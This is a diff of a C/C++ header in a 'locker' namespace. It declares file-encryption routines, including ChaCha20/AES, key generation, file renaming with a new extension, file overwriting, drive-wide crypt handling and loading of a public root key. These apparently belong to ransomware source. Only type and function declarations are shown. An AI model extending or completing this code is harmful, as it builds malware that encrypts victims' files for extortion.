@@ -4,8 +4,8 @@
 #include "api.h"
 #include "macro.h"
 #include "pathsystem.h"
-#include "chacha20/ecrypt-sync.h"
-#include "aes/aes256.h"
+#include "crypto/chacha20/ecrypt-sync.h"
+#include "crypto/aes/aes256.h"
 #include "global_parameters.h"
 
 
@@ -32,7 +32,7 @@ typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int* padding, BYTE*
 typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
 typedef BOOL (*EncryptAlgoMethod)(void* FileInfo);
 typedef BOOL (*OptionEncryptModeFunc)(void* FileInfo);
-typedef char* (*OptionNameFunc)(void* CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
+typedef char* (*OptionNameFunc)(void* CryptInfo, char* Filename, char* exst, char* FPath);
 typedef bool (*OverWriteFunc)(void* CryptInfo, DESC desc_file, unsigned filesize);
 typedef bool (*HashSumFunc)(void* hash, DESC desc, char* fullpath, char* Filename);
 
@@ -44,7 +44,9 @@ namespace locker
 	{
 		void* ctx;
 		BYTE* pblock;
-		size_t offset;
+		BYTE* IV;
+		bool status;
+		bool crypt;
 	} HEAD_BLOCK, *PHEAD_BLOCK;
 
 	typedef struct HashList
@@ -108,6 +110,7 @@ namespace locker
 		DESC recent_filehandle;
 		size_t filesize;
 		int padding;
+		PHEAD_BLOCK hblock;
 	}FILE_INFO, * PFILE_INFO;
 
 	
@@ -116,7 +119,7 @@ namespace locker
 	bool CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info);
 
 	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
-	void free_file_info(PFILE_INFO FileInfo, bool success);
+	void free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO, bool success);
 	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
 	
 	void LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
